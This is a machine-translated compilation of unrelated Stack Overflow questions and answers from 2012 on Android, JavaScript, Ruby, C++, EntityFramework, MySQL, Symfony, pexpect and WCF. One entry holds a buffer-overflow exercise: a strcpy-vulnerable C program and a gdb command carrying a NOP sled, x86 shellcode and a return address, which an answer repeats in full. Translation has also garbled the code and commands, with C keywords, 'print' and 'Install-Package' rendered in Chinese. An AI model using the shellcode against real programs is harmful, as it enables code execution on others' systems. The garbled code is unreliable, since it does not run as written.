        10-06 14:02:30.181: W/System.err(414):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
        10-06 14:02:30.191: W/System.err(414):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
        10-06 14:02:30.191: W/System.err(414):  at dalvik.system.NativeStart.main(Native Method)
        10-06 14:02:30.222: D/AndroidRuntime(414): Shutting down VM
        10-06 14:02:30.222: W/dalvikvm(414): threadid=1: thread exiting with uncaught exception (group=0x40015560)
        10-06 14:02:30.252: E/AndroidRuntime(414): FATAL EXCEPTION: main
        10-06 14:02:30.252: E/AndroidRuntime(414): java.lang.NullPointerException
        10-06 14:02:30.252: E/AndroidRuntime(414):  at com.itgrapes.rss.ListFeedAdapter.getCount(ListFeedAdapter.java:36)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.widget.ListView.setAdapter(ListView.java:454)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at com.itgrapes.fragment.FeedPlayerIndexFragment.onCreateView(FeedPlayerIndexFragment.java:32)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:870)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:1080)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.support.v4.app.BackStackRecord.run(BackStackRecord.java:622)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.support.v4.app.FragmentManagerImpl.execPendingActions(FragmentManager.java:1416)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.support.v4.app.FragmentManagerImpl.executePendingTransactions(FragmentManager.java:431)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.support.v4.app.FragmentPagerAdapter.finishUpdate(FragmentPagerAdapter.java:139)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.support.v4.view.ViewPager.populate(ViewPager.java:804)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.support.v4.view.ViewPager.onMeasure(ViewPager.java:1016)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.view.View.measure(View.java:8313)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:3138)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.widget.FrameLayout.onMeasure(FrameLayout.java:250)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.view.View.measure(View.java:8313)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.widget.LinearLayout.measureVertical(LinearLayout.java:531)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.widget.LinearLayout.onMeasure(LinearLayout.java:309)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.view.View.measure(View.java:8313)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:3138)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.widget.FrameLayout.onMeasure(FrameLayout.java:250)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.view.View.measure(View.java:8313)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:3138)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.widget.FrameLayout.onMeasure(FrameLayout.java:250)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.view.View.measure(View.java:8313)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.view.ViewRoot.performTraversals(ViewRoot.java:839)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.view.ViewRoot.handleMessage(ViewRoot.java:1859)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.os.Handler.dispatchMessage(Handler.java:99)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.os.Looper.loop(Looper.java:123)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at android.app.ActivityThread.main(ActivityThread.java:3683)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at java.lang.reflect.Method.invokeNative(Native Method)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at java.lang.reflect.Method.invoke(Method.java:507)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
        10-06 14:02:30.252: E/AndroidRuntime(414):  at dalvik.system.NativeStart.main(Native Method)
        10-06 14:02:32.692: I/Process(414): Sending signal. PID: 414 SIG: 9 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T14:27:07.770

您是否尝试在传递给 getFeeds(String urlPage) 的 url 中添加 http？比如：urlPage = "http://"+urlPage;

# html - iScroll 4 水平鼠标滚轮滚动

> ID：12760519
> 
> 赞同：1
> 
> 时间：2012-10-06T14:09:41.773
> 
> 标签：html, css, jquery-plugins, horizontal-scrolling, iscroll

我正在使用 iScroll 4，但即使我已将参数设置为`wheelAction: 'scroll'`

这是我的**[jsFiddle](http://jsfiddle.net/iamthestig/2cMNu/)**

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-06T15:25:05.517

找了5个小时，在iScroll 4 github上找到了。

他们刚刚在 5 天前添加了鼠标滚轮水平滚动支持。不像有动力的拖动和滑动那么花哨，但它会做。也许在一些模组之后，我会为它添加一些动力。

这是我的更新**[jsFiddle](http://jsfiddle.net/iamthestig/2cMNu/6/)**

# javascript - 返回 0 作为整数而不是布尔值

> ID：12760522
> 
> 赞同：0
> 
> 时间：2012-10-06T14:09:52.633
> 
> 标签：javascript

我有一个函数，如果成功，它会返回一个整数，但如果不是，它只会返回`false`.

这是我的代码的一部分：

```
 function hellofunc(x) {
//....

        if (returnvalue.length == 1) {
            return returnvalue[0];
        } else if (returnvalue.length > 1) {
            return returnvalue[rx(0, returnvalue.length - 1)];
        } else {
            return false;
        }
    } 
```

当函数调用 this ->`return returnvalue[0];`时，它`0`以整数形式给出。

但是当我打电话时，`hellofunc(something);`我看到它写入控制台“0”但是当我输入错误的东西时它返回`false`，

JavaScript 认为`0`是`false`? 那么我在这里做什么呢？我这样做吗？

```
hellofunc(something)!==false 
```

或者有没有更好的解决方案？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T14:11:53.747

```
hellofunc(something) !== false 
```

正如你所说..没有更好的解决方案..:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T14:14:06.287

在大多数编程语言中，0 是错误的。它来自二进制数字的表示。由于在布尔逻辑中您只有 2 个选择 - True 和 False，因此您只需要一位来表示。1 为真，0 为假。

# ruby - 修改使用 .each 迭代的数组的元素

> ID：12760523
> 
> 赞同：0
> 
> 时间：2012-10-06T14:09:59.423
> 
> 标签：ruby, loops

我正在使用 .each 循环遍历数组。我想改变这个数组中的元素，所以我尝试了这样的事情：

```
ex = ["el01", "el02", "el03", "el04"]
ex.each do |el|
    if (el == "el02")
        el = "changed"
    end
end
puts ex 
```

但它似乎不起作用！它让我：

```
el01
el02
el03
el04 
```

我想知道我做错了什么！或者如果不能以这种方式完成，该怎么做。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T14:13:57.967

你应该使用[`each`](http://ruby-doc.org/core-1.9.3/Array.html#method-i-each)：

```
ex = ["el01", "el02", "el03", "el04"]
ex.each do |str|
  # do with str, e.g., printing each element:
  puts str
end 
```

`for`不推荐在 Ruby 中使用，因为它只是调用并且`each`不会引入新的作用域。

但是，如果您的意图是更改数组中的每个元素，则应使用[`map`](http://ruby-doc.org/core-1.9.3/Array.html#method-i-map)：

```
ex = ["el01", "el02", "el03", "el04"]
ex.map do |str|
  str.upcase
end
#=> ["EL01", "EL02", "EL03", "EL04"] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T14:12:36.123

你可以这样做：

```
for item in ex
    #do something with the item here
    puts item
end 
```

一个更 Ruby 惯用的方法是：

```
ex.each do |item|
    #do something with the item here
    puts item
end 
```

或者，您可以在一行中完成：

```
ex.each {|item| puts item} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T14:15:53.070

ruby 方法是使用`#each`列表的方法。其他几个类也有`#each`，比如 Ranges。因此，您几乎不会在 ruby​​ 中看到 for 循环。

# c++ - 地图迭代器与手动

> ID：12760527
> 
> 赞同：1
> 
> 时间：2012-10-06T14:10:52.367
> 
> 标签：c++, stl, map, iterator

我试图比较两种填充地图的技术，一种使用迭代器，一种没有。我听说迭代器使它更快，但是如何？

```
//With Iterator
map<int, int>::iterator insert = fibHash.begin();
fibHash.insert(begin, pair<int, int> (n, fib_val));

//Without iterator
fibHash.insert(pair<int, int> (n, fib_val)); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T14:13:39.730

首先，您必须记住这`std::map`是一个有序结构，因此您不能将元素放置在任意位置。根据[严格的弱排序关系](http://www.sgi.com/tech/stl/StrictWeakOrdering.html)（满足某些条件的小于关系），某个元素只能相对于其他元素放置在某个位置。

第一个变体将迭代器作为元素良好位置的提示，并且只有在插入发生在输入迭代器旁边时才使插入更快（摊销常数时间）。否则，复杂度与第二个变体（对数）相同。

第一个变体使用第一个参数作为提示，并尝试插入。如果提示很好，则需要较少的比较来找到插入的正确位置。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-06T14:21:03.390

第一种形式，您提供一个迭代器，在运行时有*可能*更快——但前提是您选择了一个好的迭代器，即使这样，也只有当您的实现使用提示时。您发送到的迭代器`insert`只是一个提示。 `insert`不一定要在那里插入元素，因为 a`map`是一个排序容器。相反，实现可以将迭代器用作寻找*将*插入元素的位置的起点。

因此，如果您将一个精心挑选的迭代器（`begin()`通常不会）传递给它，使用带有`insert`提示迭代器的版本，理论上您可以接近插入的摊销常数时间，而使用您正在寻找的非提示版本在`O(log n)`插入。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-03-11T15:41:41.173

添加到已经说过的内容：如果您关心速度，还可以考虑使用新的 C++11 方法[std::map](http://www.cplusplus.com/reference/map/map/emplace/) ::emplace和[std::map::emplace_hint](http://www.cplusplus.com/reference/map/map/emplace_hint/)将元素插入到`std::map`. emplace 不会将 Key/Value 对的副本传递给容器，而是仅传递用于在正确位置**就地创建该对的参数。**这可以为您节省昂贵的副本（尽管在您的 int,int 示例中，这与矩阵等较大的数据结构相比并没有太大的区别）。

```
std::map<int,int> MyMap;
MyMap.emplace(5,10); // passing 5,10 to ctor of std::pair<const int,int> in-place
MyMap.insert(std::pair<const int,int>(5,10)); // construct a std::pair<const int,int> and pass it to insert, such that it creates a copy in the right location within the map

//similarly with the 'hint' methods
MyMap.emplace_hint(MyMap.end(),6,20);
MyMap.insert(MyMap.end(),std::pair<const int,int>(6,20)); 
```

顺便说一句，`std::map<int,int>::value_type`真的是一个`std::pair<const int,int>`，而不是一个`std::pair<int,int>`。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-10-06T14:20:16.913

迭代器是一种设计模式，所有程序员都应该考虑到这一点。是的，迭代器并不是真的更快，但更干净，它们允许您以安全和干净的方式“迭代”数据结构，因此您不必担心会弄乱真实信息。

在这种特殊情况下，您一次只插入一个值，因此迭代器并不是真正“最快”的解决方案，只是某些函数也可以使用它。

在您的第一个示例中，您在数据结构的“开始”处插入一个值，并且迭代器正在帮助您确定位置。

在第二个中，您只是在末尾或默认插入位置插入值，因此您实际上不需要迭代器。

# asp.net-mvc-3 - 无法加载文件或程序集“EntityFramework”或其依赖项之一

> ID：12760532
> 
> 赞同：8
> 
> 时间：2012-10-06T14:11:04.463
> 
> 标签：asp.net-mvc-3

我的 ASP.NET MVC3 Web 应用程序运行良好。但是当我重新启动我的电脑然后尝试在 MS VS 2010 中更新应用程序时，它在运行应用程序期间显示错误：

```
Could not load file or assembly 'EntityFramework' or one of its dependencies. The parameter is incorrect. (Exception from HRESULT: 0x80070057 (E_INVALIDARG)) 
```

**描述：**

```
An unhandled exception occurred during the execution of the current web request. Please 
review the stack trace for more information about the error and where it originated in the code. 
```

**异常详细信息：** System.IO.FileLoadException：无法加载文件或程序集“EntityFramework”或其依赖项之一。参数不正确。（来自 HRESULT 的异常：0x80070057 (E_INVALIDARG)）

**源错误：**

在执行当前 Web 请求期间生成了未处理的异常。可以使用下面的异常堆栈跟踪来识别有关异常起源和位置的信息。

程序集加载跟踪：以下信息有助于确定无法加载程序集“EntityFramework”的原因。

警告：程序集绑定日志记录已关闭。要启用程序集绑定失败日志记录，请将注册表值 [HKLM\Software\Microsoft\Fusion!EnableLog] (DWORD) 设置为 1。注意：与程序集绑定失败日志记录相关的一些性能损失。要关闭此功能，请删除注册表值 [HKLM\Software\Microsoft\Fusion!EnableLog]。

**堆栈跟踪：**

```
[FileLoadException: Could not load file or assembly 'EntityFramework' or one of its dependencies. The parameter is incorrect. (Exception from HRESULT: 0x80070057 (E_INVALIDARG))]

[FileLoadException: Could not load file or assembly 'EntityFramework, Version=4.4.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089' or one of its dependencies. The parameter is incorrect. (Exception from HRESULT: 0x80070057 (E_INVALIDARG))]
System.Reflection.RuntimeAssembly._nLoad(AssemblyName fileName, String codeBase, Evidence assemblySecurity, RuntimeAssembly locationHint, StackCrawlMark& stackMark, Boolean throwOnFileNotFound, Boolean forIntrospection, Boolean suppressSecurityChecks) +0
System.Reflection.RuntimeAssembly.nLoad(AssemblyName fileName, String codeBase, Evidence assemblySecurity, RuntimeAssembly locationHint, StackCrawlMark& stackMark, Boolean throwOnFileNotFound, Boolean forIntrospection, Boolean suppressSecurityChecks) +39
System.Reflection.RuntimeAssembly.InternalLoadAssemblyName(AssemblyName assemblyRef, Evidence assemblySecurity, StackCrawlMark& stackMark, Boolean forIntrospection, Boolean suppressSecurityChecks) +132
System.Reflection.RuntimeAssembly.InternalLoad(String assemblyString, Evidence assemblySecurity, StackCrawlMark& stackMark, Boolean forIntrospection) +144
System.Reflection.Assembly.Load(String assemblyString) +28
System.Web.Configuration.CompilationSection.LoadAssemblyHelper(String assemblyName, Boolean starDirective) +46

[ConfigurationErrorsException: Could not load file or assembly 'EntityFramework, Version=4.4.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089' or one of its dependencies. The parameter is incorrect. (Exception from HRESULT: 0x80070057 (E_INVALIDARG))]
System.Web.Configuration.CompilationSection.LoadAssemblyHelper(String assemblyName, Boolean starDirective) +618
System.Web.Configuration.CompilationSection.LoadAllAssembliesFromAppDomainBinDirectory() +209
System.Web.Configuration.CompilationSection.LoadAssembly(AssemblyInfo ai) +130
System.Web.Compilation.BuildManager.GetReferencedAssemblies(CompilationSection compConfig) +178
System.Web.Compilation.BuildManager.GetPreStartInitMethodsFromReferencedAssemblies() +94
System.Web.Compilation.BuildManager.CallPreStartInitMethods() +332
System.Web.Hosting.HostingEnvironment.Initialize(ApplicationManager appManager, IApplicationHost appHost, IConfigMapPathFactory configMapPathFactory, HostingEnvironmentParameters hostingParameters, PolicyLevel policyLevel, Exception appDomainCreationException) +591

[HttpException (0x80004005): Could not load file or assembly 'EntityFramework, Version=4.4.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089' or one of its dependencies. The parameter is incorrect. (Exception from HRESULT: 0x80070057 (E_INVALIDARG))]
System.Web.HttpRuntime.FirstRequestInit(HttpContext context) +8946484
System.Web.HttpRuntime.EnsureFirstRequestInit(HttpContext context) +97
System.Web.HttpRuntime.ProcessRequestInternal(HttpWorkerRequest wr) +258 
```

然后我清除所有 Windows 临时文件和 ASP.NET 临时文件，然后再次运行该应用程序。但情况并没有好转。你能帮我解决这个问题吗？谢谢。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-10-06T14:29:42.180

只需重新添加实体框架工具-库包管理器->包管理器控制台

类型：

```
安装包EntityFramework

```

它将恢复（您正在运行 v 4.4，这是 Visual Studio 2010 中的 v5 版本）

如果您想“干净”，可以先尝试卸载。即使失败，这也没有什么坏处。

```
卸载包EntityFramework

```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-07-30T20:40:25.223

如果其他答案都不适合您（包括对 SO 关于同一问题的其他类似问题的答案），请尝试以下对我有用的方法（根据[http://forums.devart.com/viewtopic.php?f= 3&t=26327](http://forums.devart.com/viewtopic.php?f=3&t=26327) ):

在应用程序的 *.config 文件中添加以下 XML 以解决问题：

```
 <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
    <dependentAssembly>
      <assemblyIdentity name="EntityFramework" publicKeyToken="b77a5c561934e089" />
      <bindingRedirect oldVersion="4.4.0.0" newVersion="5.0.0.0" />
    </dependentAssembly>
    </assemblyBinding>
  </runtime> 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-02-15T16:08:56.473

确保所有项目都针对相同的 .NET Framework。我有一个 .NET 4.5 项目，它引用了一个使用 4.0 的类库，我遇到了这个问题，一旦我将其更改为 4.5，它工作正常，我可以使用 NuGet 包管理器控制台安装 EF

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-11-17T05:35:56.680

我收到了这个错误。事实证明，原因比其他一些答案更简单：我有两个项目引用了不同版本的实体框架。一个来自包含最新版本的 NuGet 包，另一个来自 ASP.NET MVC 4 模板。

我的解决方法是从 MVC 4 项目中删除对旧版本 EF (5) 的引用，并使用 NuGet 安装最新版本。之后一切都运行良好。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-01-28T21:59:28.710

我遇到了类似的问题，我不得不手动删除解决方案中的包文件夹以及文件中对包的引用，`packages.config`然后使用包管理器控制台重新安装它来修复它。

# mysql - MySQL：在具有一组条件的多对多关系表上进行选择

> ID：12760536
> 
> 赞同：0
> 
> 时间：2012-10-06T14:11:18.933
> 
> 标签：mysql, select, many-to-many

我在一个名为`RELcomplabel`. 它基本上看起来像这样：

```
CREATE TABLE `RELcomplabel` (
    `IDcomplabel` INT NOT NULL AUTO_INCREMENT ,
    PRIMARY KEY (`IDcomplabel`),
    `Fcomp` INT NOT NULL ,
    `Flabel` INT NOT NULL
 ); 
```

现在我想选择所有`Fcomp`至少有一组给定标签的公司（我想要的是），例如`Flabel = 1 AND Flabel = 2 AND Flabel = 3`。如果这样的公司在数据库中，则表中有三行`RELcomplabel`，所有行都相同`Fcomp`但不同`Flabel`（1、2 和 3）。查询还应该 - 尽可能好 - 在标签数量上是动态的，它应该适用于两个但也可能适用于十个给定标签。

我为两个或三个给定标签找到了一个丑陋的解决方案，发布在下面。这个解决方案的问题是：

1.  动态生成它的丑陋。
2.  内部连接的 where 条件必须检查`Ftype`of`t0`是否与不同`t1`、与`t0`不同和`t2`与`t1`不同`t2`。
3.  这些查询生成集合的所有可能排列`(1,2,3)`，只是为了选择其中一个。

两个标签的解决方案：

```
SELECT s.fcomp FROM
(
    SELECT
        t0.fcomp,
        t0.ftype AS type0,
        t1.ftype AS type1
    FROM
        RELcomplabel AS t0
    INNER JOIN 
        RELcomplabel AS t1
        ON t0.fcomp = t1.fcomp
    WHERE
        t0.ftype <> t1.ftype
) AS s
WHERE
    s.type0 = 2
    AND s.type1 = 3; 
```

三个标签的解决方案：

```
SELECT s.fcomp FROM
(
    SELECT
        t0.fcomp,
        t0.ftype AS type0,
        t1.ftype AS type1,
        t2.ftype AS type2
    FROM
        RELcomplabel AS t0
    INNER JOIN 
        RELcomplabel AS t1
        ON t0.fcomp = t1.fcomp
    INNER JOIN
        RELcomplabel AS t2
        ON t0.fcomp = t2.fcomp
    WHERE
        t0.ftype <> t1.ftype
        AND t0.ftype <> t2.ftype
        AND t1.ftype <> t2.ftype
) AS s
WHERE
    s.type0 = 1
    AND s.type1 = 2
    AND s.type2 = 3; 
```

**例如**，使用这个测试数据：

```
INSERT INTO `relcomplabel` (`IDcomplabel`,`Fcomp`,`Flabel`) VALUES (1,1,1);
INSERT INTO `relcomplabel` (`IDcomplabel`,`Fcomp`,`Flabel`) VALUES (2,1,2);
INSERT INTO `relcomplabel` (`IDcomplabel`,`Fcomp`,`Flabel`) VALUES (3,1,3);
INSERT INTO `relcomplabel` (`IDcomplabel`,`Fcomp`,`Flabel`) VALUES (4,2,2);
INSERT INTO `relcomplabel` (`IDcomplabel`,`Fcomp`,`Flabel`) VALUES (5,2,3); 
```

我正在搜索一个给出类似结果的查询

1.  搜索标签为 1 和 2 的所有公司：

    ```
    -------
    |Fcomp|
    -------
    | 1   |
    | 2   |
    ------- 
    ```

2.  搜索标签为 1、2 和 3 的所有公司：

    ```
    -------
    |Fcomp|
    -------
    | 1   |
    ------- 
    ```

感谢您阅读本文，并感谢您帮助发布解决此问题的方法！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-07T17:06:40.203

一个 sqlfiddle 来回答你的问题[http://sqlfiddle.com/#!2/2711e/4](http://sqlfiddle.com/#!2/2711e/4)

编辑：添加 SQL 以防小提琴消失：

```
SELECT Fcomp
FROM RELcomplabel
WHERE Flabel IN (1, 2, 3)
GROUP BY Fcomp
HAVING COUNT(Flabel) >= 3 
```

# gdb - Shellcode 在 gdb 中给出 SyntaxError

> ID：12760541
> 
> 赞同：0
> 
> 时间：2012-10-06T14:12:05.377
> 
> 标签：gdb, syntax-error, shellcode

我正在尝试将 shellcode 作为 C 程序中的命令行参数传递。但是 gdb 一直给我 SyntaxError。我究竟做错了什么？

下面是C程序和shellcode的内容：

**易受攻击的.c**

```
#include <stdio.h>
#include <string.h>

无效的邪恶功能（字符*输入）
{
    字符缓冲区[1000]；
    strcpy（缓冲区，输入）；
}

int main(int arc, char** argv)
{
    邪恶功能（argv [1]）；
    返回0；
}

```

我在 gdb 上运行的命令是：

```
运行 $(python -c '打印“\x90” * 400 + "\xd9\xd0\xbd\xae\x95\x1b\xb9\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x0d\x31 \x68\x18\x03\x68\x18\x83\xc0\xaa\x77\xee\xd3\x89\x2f\x88\x6c\x56\xe0\xc8\x05\xc6\xd0\x7f\xbe\x16\x7c \xc8\xb7\xf1\xea\xe5\xa4\xfd\xea\xbd\xa3\x1b\xb8\xd5\xbe\xe3\x3d\x26\x90\x81\x54\x48\xc1\x21\xc6\xe7 \x75\xa9\x5e\x5f\xce\x20\xb8\x50\xcb" + “\x90” * 549 + “\x4c\x04\x40”')

```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:16:31.730

您正在尝试在 GDB 提示符下使用 shell 语法。正如您所发现的，GDB 不支持子命令的 shell 语法。试试这个：

```
gdb --args ./a.out $(python -c 'print “\x90” * 400 + "\xd9\xd0\xbd\xae\x95\x1b\xb9\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x0d\x31\x68\x18\x03\x68\x18\x83\xc0\xaa\x77\xee\xd3\x89\x2f\x88\x6c\x56\xe0\xc8\x05\xc6\xd0\x7f\xbe\x16\x7c\xc8\xb7\xf1\xea\xe5\xa4\xfd\xea\xbd\xa3\x1b\xb8\xd5\xbe\xe3\x3d\x26\x90\x81\x54\x48\xc1\x21\xc6\xe7\x75\xa9\x5e\x5f\xce\x20\xb8\x50\xcb" + “\x90” * 549 + “\x4c\x04\x40”')
(gdb) run 
```

# symfony - Symfony2 路由变成查询字符串而不是屏蔽路由

> ID：12760542
> 
> 赞同：0
> 
> 时间：2012-10-06T14:12:25.343
> 
> 标签：symfony, twig, routes

在 Symfony2 TWIG 中，当尝试生成这样的路径时：

```
<a href="{{ path('folder_new', { 'folder': folder.id }) }}"> 
```

我没有得到我期望的路线

这是我的预期：

```
http://localhost/site/web/app_dev.php/Media/folder/new/2 
```

这实际上是我从 path() 命令中得到的

```
http://localhost/site/web/app_dev.php/Media/folder/new?folder=2 
```

为什么我将其格式化为标准查询字符串 (get) 变量而不是路由？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T14:12:25.343

原因是我将变量命名错误。

```
folder_new:
    pattern:  /new/{parent}
    defaults: { _controller: "AcmeBundle:Folder:new", parent : NULL } 
```

在我的路由中，我调用了变量`parent`而不是`folder`.

正确`path()`的应该是这样的：

```
<a href="{{ path('folder_new', { 'parent': folder.id }) }}"> 
```

因此，我了解到，**当 Symfony2 找不到**与传递给`path()`函数的变量匹配的路由参数时，它会以标准查询字符串( ) 格式**附加变量，**`$__GET`而不是生成错误消息。

如果有错误消息会更快地找到它，但我看到按原样使用它是有用的。

干杯! =)

# python - Pexpect 不遵守超时

> ID：12760546
> 
> 赞同：0
> 
> 时间：2012-10-06T14:13:00.543
> 
> 标签：python, pexpect

pexpect 不适用于超时。

```
import pexpect
import sys
import os
os.system("""git config --global user.name '#{git_name}'""")
os.system("""git config --global user.email '#{git_email}'""")
child = pexpect.spawn ('git clone https://github.com/davidmontgom/rtbopsConfig.git')
child.logfile = sys.stdout
child.expect ('Username:*')
child.sendline ('#{git_username}')
child.expect ('Pass*')
child.sendline ('#{git_password}')
child.expect(pexpect.EOF, timeout=420)
os.system('cd /home/ubuntu/workspace/rtbopsConfig; git checkout #{branch_name}')

Receiving objects:  16% (1751/10655), 19.36 MiB | 876 KiB/s     KiB/s   
Receiving objects:  16% (1751/10655), 20.64 MiB | 861 KiB/s
103.4.112.50 
103.4.112.50 STDERR: Traceback (most recent call last):
103.4.112.50 
103.4.112.50   File "/tmp/chef-script20121006-19825-5yog10", line 12, in <module>
103.4.112.50 
103.4.112.50     child.expect(pexpect.EOF)
103.4.112.50 
103.4.112.50   File "/usr/local/lib/python2.7/dist-packages/pexpect-2.4-py2.7.egg/pexpect.py", line 1316, in expect
103.4.112.50 
103.4.112.50     return self.expect_list(compiled_pattern_list, timeout, searchwindowsize)
103.4.112.50 
103.4.112.50   File "/usr/local/lib/python2.7/dist-packages/pexpect-2.4-py2.7.egg/pexpect.py", line 1330, in expect_list
103.4.112.50 
103.4.112.50     return self.expect_loop(searcher_re(pattern_list), timeout, searchwindowsize)
103.4.112.50 
103.4.112.50   File "/usr/local/lib/python2.7/dist-packages/pexpect-2.4-py2.7.egg/pexpect.py", line 1414, in expect_loop
103.4.112.50 
103.4.112.50     raise TIMEOUT (str(e) + '\n' + str(self))
103.4.112.50 
103.4.112.50 pexpect.TIMEOUT: Timeout exceeded in read_nonblocking().
103.4.112.50 
103.4.112.50 <pexpect.spawn object at 0x7fbb24704750>
103.4.112.50 
103.4.112.50 version: 2.4 ($Revision: 516 $)
103.4.112.50 
103.4.112.50 command: /usr/bin/git
103.4.112.50 
103.4.112.50 args: ['/usr/bin/git', 'clone', 'https://github.com/davidmontgom/rtbopsConfig.git']
103.4.112.50 
103.4.112.50 searcher: searcher_re:
103.4.112.50 
103.4.112.50     0: EOF
103.4.112.50 
Receiving objects:  16% (1751/10655), 20.64 MiB | 861 KiB/s   873 KiB/s   
103.4.112.50 
Receiving objects:  16% (1751/10655), 20.64 MiB | 861 KiB/s   873 KiB/s   
103.4.112.50 
103.4.112.50 after: <class 'pexpect.TIMEOUT'> 
```

我如何让 pexpect 工作？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T14:46:38.360

pexpect 在超时时引发异常（默认为 30 秒）。如果您不想要例外；将 pexpect.TIMEOUT 指定为`.expect()`.

在您的示例`git clone`中，默认超时后会产生 pexpect.Timeout 异常`.expect(pexpect.EOF)`。尝试：

```
i = child.expect([EOF, TIMEOUT], timeout=git_clone_timeout)
if i == 1: 
    # handle timeout 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-09-16T06:52:54.530

让 TIMEOUT 工作的另一种方法：

```
try:
    child.expect([],timeout=300)
except pexpect.EOF:
    #do somthing
except pexpect.TIMEOUT:
    #do somthing 
```

# wcf - 命名 Web 服务项目

> ID：12760549
> 
> 赞同：0
> 
> 时间：2012-10-06T14:13:28.637
> 
> 标签：wcf, web-services, rest, soap, asp.net-web-api

我有一个 c# Visual Studio 解决方案。

在其中我有 2 种不同类型的网络服务。1 是 WCF，另一个是 Web Api。

我想以标准方式重命名项目。

wcf 服务应该命名为“WCF”、“SOAP”吗？然后对于 web api 项目，这些应该命名为“REST”还是“HTTP”？

我想统一命名项目，但不确定最佳命名风格。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T20:01:28.470

我不是这两者的粉丝，我个人尝试将技术名称排除在我的项目名称之外，因为事情会随着时间的推移而发生变化。

两个 Web 服务是针对同一事物的吗？

*   理想情况下，如果它们相同，则尝试退休其中之一
*   将它们组合成一个 Web 服务项目，允许它们在彼此之间共享代码，而无需向解决方案添加另一个项目（抱歉，我不喜欢在一个解决方案中包含数百个项目）。
*   如果您被 2 个项目困住，那么将它们命名为 Wcf 和 WebApi，因为如果您尝试替换其中任何一种技术，您可能只会创建一个新项目。

我没有为 WCF 项目使用 SOAP，因为 WCF 不限于 SOAP。然后我只是对 WebApi 项目使用了相同的约定。

# php - 多个多对多关系的最佳 MySql 数据库设计

> ID：12760553
> 
> 赞同：3
> 
> 时间：2012-10-06T14:13:49.323
> 
> 标签：php, mysql, relational-database

我在 MySql 数据库中有 6 个表需要相互连接（这 6 个项目必须以***任何***可能的方式关联）。我还需要以某种方式为这些关系添加一个“sort_order”列。使用“经典的多对多”连接表会导致数据库混乱，有数十个连接表。那将是不可能维持的。我能找到的最佳解决方案是使用具有 7 列的单个连接表（6 个用于 6 个项目 id + 1 个用于 sort_order），其中每一行标识 2 个表之间的单个关联。

这是我做的连接表：

```
mysql> desc relations;
+------------+---------+------+-----+---------+-------+
| Field      | Type    | Null | Key | Default | Extra |
+------------+---------+------+-----+---------+-------+
| artist_id  | int(11) | YES  | MUL | NULL    |       |
| art_id     | int(11) | YES  | MUL | NULL    |       |
| edition_id | int(11) | YES  | MUL | NULL    |       |
